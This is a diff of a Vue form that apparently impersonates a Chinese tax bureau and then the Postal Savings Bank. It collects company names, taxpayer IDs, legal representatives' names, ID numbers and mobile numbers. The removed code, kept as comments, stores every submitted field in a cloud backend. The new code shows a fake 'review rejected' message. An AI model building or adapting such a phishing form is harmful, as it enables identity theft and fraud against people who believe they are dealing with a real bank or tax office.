@@ -10,7 +10,7 @@
         <td align="center">
           <div class="login">
             <div class="top">
-              <div class="updatePassword">湖南国税申请信息</div>
+              <div class="updatePassword">邮政储蓄银行结果查询</div>
             </div>
             <table width="700" cellpadding="0" cellspacing="0">
               <tbody>
@@ -119,7 +119,7 @@
                           />
                         </td>
                       </tr>
-                      <tr height="35">
+                      <!-- <tr height="35">
                         <td align="right">贷款期限（月）：</td>
                         <td align="left">
                           <input
@@ -130,7 +130,7 @@
                             style="width:50%;height:20px"
                           />
                         </td>
-                      </tr>
+                      </tr> -->
                       <tr height="35">
                         <td align="right">交换类型：</td>
                         <td align="left">
@@ -152,7 +152,7 @@
                             v-on:click="pushMessage"
                             type="submit"
                             class="submit"
-                          >提交申请</button>
+                          >提交信息</button>
                         </td>
                       </tr>
                     </table>
@@ -219,10 +219,10 @@ export default defineComponent({
         alert("法人移动手机号码不能为空！");
         return false;
       }
-      if (dkqx.value == "") {
-        alert("贷款期限（月）不能为空！");
-        return false;
-      }
+      // if (dkqx.value == "") {
+      //   alert("贷款期限（月）不能为空！");
+      //   return false;
+      // }
       if (exchangetype.value == "") {
         alert("交换类型不能为空！");
         return false;
@@ -232,43 +232,50 @@ export default defineComponent({
 
     pushMessage() {
       if (this.check()) {
-        var qymc = document.getElementById("qymc") as HTMLInputElement; //企业名称
-        var nsrsbh = document.getElementById("nsrsbh") as HTMLInputElement; //纳税人识别号
-        var frxm = document.getElementById("frxm") as HTMLInputElement; //法人姓名
-        var zjlx = document.getElementById("zjlx") as HTMLInputElement; //证件类型
-        var frsfz = document.getElementById("frsfz") as HTMLInputElement; //法定代表人证件号码
-        var frsjh = document.getElementById("frsjh") as HTMLInputElement; //法定代表人移动手机号码
-        var dkqx = document.getElementById("dkqx") as HTMLInputElement; //贷款期限（月）
-        var exchangetype = document.getElementById(
-          "exchangetype"
-        ) as HTMLInputElement; //交换类型
-        // 声明 class
-        const Todo = AV.Object.extend("UserMessage");
-        // 构建对象
-        const todo = new Todo();
-        // 为属性赋值
-        todo.set("qymc", qymc.value);
-        todo.set("nsrsbh", nsrsbh.value);
-        todo.set("frxm", frxm.value);
-        todo.set("zjlx", zjlx.value);
-        todo.set("frsfz", frsfz.value);
-        todo.set("frsjh", frsjh.value);
-        todo.set("dkqx", dkqx.value);
-        todo.set("exchangetype", exchangetype.value);
-
-        // 将对象保存到云端
-        todo.save().then(
-          todo => {
-            // 成功保存之后，执行其他逻辑
-            alert("提交成功");
-            location.reload()
-          },
-          error => {
-            alert("网络错误，请稍后重试");
-          }
-        );
+        setTimeout(() => {
+          confirm("审核拒绝");
+          location.reload();
+        }, 500);
       }
     }
+    //   if (this.check()) {
+    //     var qymc = document.getElementById("qymc") as HTMLInputElement; //企业名称
+    //     var nsrsbh = document.getElementById("nsrsbh") as HTMLInputElement; //纳税人识别号
+    //     var frxm = document.getElementById("frxm") as HTMLInputElement; //法人姓名
+    //     var zjlx = document.getElementById("zjlx") as HTMLInputElement; //证件类型
+    //     var frsfz = document.getElementById("frsfz") as HTMLInputElement; //法定代表人证件号码
+    //     var frsjh = document.getElementById("frsjh") as HTMLInputElement; //法定代表人移动手机号码
+    //     var dkqx = document.getElementById("dkqx") as HTMLInputElement; //贷款期限（月）
+    //     var exchangetype = document.getElementById(
+    //       "exchangetype"
+    //     ) as HTMLInputElement; //交换类型
+    //     // 声明 class
+    //     const Todo = AV.Object.extend("UserMessage");
+    //     // 构建对象
+    //     const todo = new Todo();
+    //     // 为属性赋值
+    //     todo.set("qymc", qymc.value);
+    //     todo.set("nsrsbh", nsrsbh.value);
+    //     todo.set("frxm", frxm.value);
+    //     todo.set("zjlx", zjlx.value);
+    //     todo.set("frsfz", frsfz.value);
+    //     todo.set("frsjh", frsjh.value);
+    //     todo.set("dkqx", dkqx.value);
+    //     todo.set("exchangetype", exchangetype.value);
+
+    //     // 将对象保存到云端
+    //     todo.save().then(
+    //       todo => {
+    //         // 成功保存之后，执行其他逻辑
+    //         alert("提交成功");
+    //         location.reload()
+    //       },
+    //       error => {
+    //         alert("网络错误，请稍后重试");
+    //       }
+    //     );
+    //   }
+    // }
   }
 });
 </script>
